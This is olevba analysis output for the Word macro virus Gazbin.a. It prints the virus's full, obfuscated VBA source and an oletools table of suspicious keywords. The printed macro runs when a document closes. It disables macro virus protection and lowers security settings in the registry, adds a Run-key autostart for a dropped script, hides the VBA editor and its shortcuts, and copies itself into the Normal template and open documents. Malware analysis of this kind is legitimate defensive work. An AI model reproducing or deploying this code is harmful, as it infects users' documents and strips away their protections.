olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Gazbin.a-c3fd72077089c19374a99d1273da6e56d384944445073f122a400830e2d5b4fe
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Gazbin.a-c3fd72077089c19374a99d1273da6e56d384944445073f122a400830e2d5b4fe - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Gazbin.a-c3fd72077089c19374a99d1273da6e56d384944445073f122a400830e2d5b4fe - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub GazBin() 'IK
GazBin_VisB = "Vi" & "su" & "al" & " Ba" & "sic"
GazBin_CuZt = "Cu" & "st" & "om" & "ize" & "..."
GazBin_TooL = "To" & "ol" & "s"
GazBin_MaCr = "Ma" & "cr" & "o"
GazBin_Name = "Ga" & "zB" & "in"
Gazbin_97 = "HK" & "EY_" & "CUR" & "REN" & "T_U" & "SER" & "\S" & "of" & "twa" & "re\" & "Mic" & "ros" & "oft" & "\Of" & "fic" & "e\8" & ".0" & "\W" & "ord" & "\Op" & "ti" & "ons"
Gazbin_Reg = "HK" & "EY_" & "CUR" & "REN" & "T_U" & "SER" & "\S" & "of" & "twa" & "re\" & "Mic" & "ros" & "oft" & "\Of" & "fic" & "e\9" & ".0\" & "Wor" & "d\" & "Sec" & "uri" & "ty"
Gazbin_XP = "HK" & "EY_" & "CUR" & "REN" & "T_U" & "SER" & "\S" & "of" & "twa" & "re\" & "Mic" & "ros" & "oft" & "\Of" & "fic" & "e\10" & ".0\" & "Wor" & "d\" & "Sec" & "uri" & "ty"
Gazbin_run = "HK" & "EY_" & "CUR" & "REN" & "T_U" & "SER" & "\S" & "of" & "twa" & "re\" & "Mic" & "ros" & "oft\" & "Wi" & "nd" & "ows" & "\Cu" & "rren" & "tVer" & "si" & "on\" & "Run"
GazBin_ACVB = "Ac" & "ces" & "sVB" & "OM"
Gazbin_LVL = "Le" & "v" & "el"
Gazbin_EMVP = "En" & "abl" & "eMac" & "roVir" & "usPro" & "tect" & "ion"
Gazbin_Sys = Environ("Wi" & "nd" & "ir") & "\s" & "ys" & "tem" & "\Ga" & "zbi" & "n.s" & "ys"
Gazbin_vbs = Environ("Wi" & "nd" & "ir") & "\s" & "ys" & "tem" & "\Ga" & "zbi" & "n.v" & "bs"
GazBin_Chk = "Pri" & "vat" & "e S" & "ub " & "Gaz" & "bin" & "() " & "'I" & "K"
GazBin_One = ((Tan(Rnd * Gazbin_Null) + Fix(Rnd * Gazbin_Null)) * Gazbin_Null) + Fix(Gazbin_Null + 1)
Gazbin_Null = (Sin(Rnd * False) + Tan(Rnd * False)) * False
GazBin_Two = ((Sin(Rnd * GazBin_One) + Cos(Rnd * GazBin_One)) * Gazbin_Null) + Fix(GazBin_One + GazBin_One)
GazBin_Hone = &H1
GazBin_HNul = &H0
GazBin_KF11 = wdKeyF11
GazBin_KAlt = wdKeyAlt
GazBin_KF8 = wdKeyF8
GazBin_NCV = msoBarNoChangeVisible
GazBin_NCZ = msoBarNoCustomize
GazBin_WDA = wdAlertsNone
GazBin_ECK = wdCancelDisabled
Gazbin_Code = ThisDocument.VBProject.VBComponents(GazBin_One).codemodule.lines(GazBin_One, GazBin_One & Gazbin_Null & Gazbin_Null & Gazbin_Null)
Set GazBin_Adoc = ActiveDocument
Set GazBin_Norm = NormalTemplate
Set GaZbin_Mcon = MacroContainer
Set GaZbin_syst = System
Set GazBin_CVB = CommandBars(GazBin_VisB)
Set GazBin_CTL = CommandBars(GazBin_TooL)
Set GazBin_Opt = Options
Set Gazbin_App = Application

Open Gazbin_Sys For Output As #1
Print #1, Gazbin_Code
Close #1

Open Gazbin_vbs For Output As #1
Print #1, "O" & "n " & "erro" & "r re" & "sume ne" & "xt"
Print #1, "Ga" & "zBin_Nu" & "ll =" & " (Si" & "n(R" & "nd *" & " Fal" & "se)" & " + " & "Tan" & "(Rn" & "d *" & " F" & "al" & "se)" & ") * " & "F" & "alse"
Print #1, "Gazb" & "in_O" & "ne = ((" & "Tan(" & "Rnd " & "* Ga" & "zBi" & "n_Null) + Fi" & "x(R" & "nd * Gaz" & "Bin_" & "N" & "ull)) * GazBi" & "n_N" & "ull) + Fi" & "x(Ga" & "zB" & "in_" & "Nul" & "l +" & " 1)"
Print #1, "Set" & " wrd" & " = Cr" & "eate" & "oBject(" & Chr(34) & "Wo" & "rd.Ap" & "plic" & "ation" & Chr(34) & ")"
Print #1, "with" & " wrd" & ".nor" & "malt" & "emp" & "lat" & "e.v" & "bpr" & "ojec" & "t.vb" & "com" & "pon" & "ents" & "(Ga" & "zbin" & "_On" & "e).c" & "odem" & "odule"
Print #1, "Gazbi" & "n_All" & "Lines =" & " .Coun" & "tOfL" & "ines"
Print #1, ".Del" & "etel" & "ines " & "Gazbi" & "n_One" & ", Ga" & "zbi" & "n_Al" & "lLines"
Print #1, ".A" & "ddfr" & "omfi" & "le " & Chr(34) & Gazbin_Sys & Chr(34)
Print #1, "en" & "d wi" & "th"
Print #1, "wr" & "d.Qu" & "it"
Close #1

With GaZbin_syst
.PrivateProfileString("", Gazbin_97, Gazbin_EMVP) = GazBin_HNul
.PrivateProfileString("", Gazbin_Reg, Gazbin_LVL) = GazBin_Hone
.PrivateProfileString("", Gazbin_XP, Gazbin_LVL) = GazBin_Hone
.PrivateProfileString("", Gazbin_XP, GazBin_ACVB) = GazBin_Hone
.PrivateProfileString("", Gazbin_run, GazBin_Name) = Gazbin_vbs
End With

With GazBin_CVB
.Visible = Gazbin_Null
.Enabled = Gazbin_Null
.Protection = GazBin_NCV
.Protection = GazBin_NCZ
End With

With GazBin_CTL
.Controls(GazBin_MaCr).Enabled = Gazbin_Null
.Controls(GazBin_CuZt).Enabled = Gazbin_Null
End With

With GazBin_Opt
.SaveNormalPrompt = Gazbin_Null
.ConfirmConversions = Gazbin_Null
End With

With Gazbin_App
.DisplayAlerts = GazBin_WDA
.ScreenUpdating = Gazbin_Null
.DisplayStatusBar = Gazbin_Null
.EnableCancelKey = GazBin_ECK
.ShowVisualBasicEditor = Gazbin_Null
End With

FindKey(BuildKeyCode(GazBin_KF11, GazBin_KAlt)).Disable
FindKey(BuildKeyCode(GazBin_KF8, GazBin_KAlt)).Disable

If GaZbin_Mcon = GazBin_Adoc Then Set Gazbin_Target = GazBin_Norm
If GaZbin_Mcon = GazBin_Norm Then Set Gazbin_Target = GazBin_Adoc

If Gazbin_Target = GazBin_Adoc Then Gazbin_Target.ReadOnlyRecommended = Gazbin_Null

With Gazbin_Target.VBProject.VBComponents(GazBin_One).codemodule
Gazbin_AllLines = .codepane.codemodule.CountOfLines
If .codepane.codemodule.lines(GazBin_One, GazBin_One) <> GazBin_Chk Then
.codepane.codemodule.DeleteLines GazBin_One, Gazbin_AllLines
.codepane.codemodule.insertlines GazBin_One, Gazbin_Code
End If
End With

End Sub
Private Sub Document_Close()
Call GazBin
End Sub





























+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |t.vb                |Executable file name                         |
|Base64    |z{l                 |ents                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

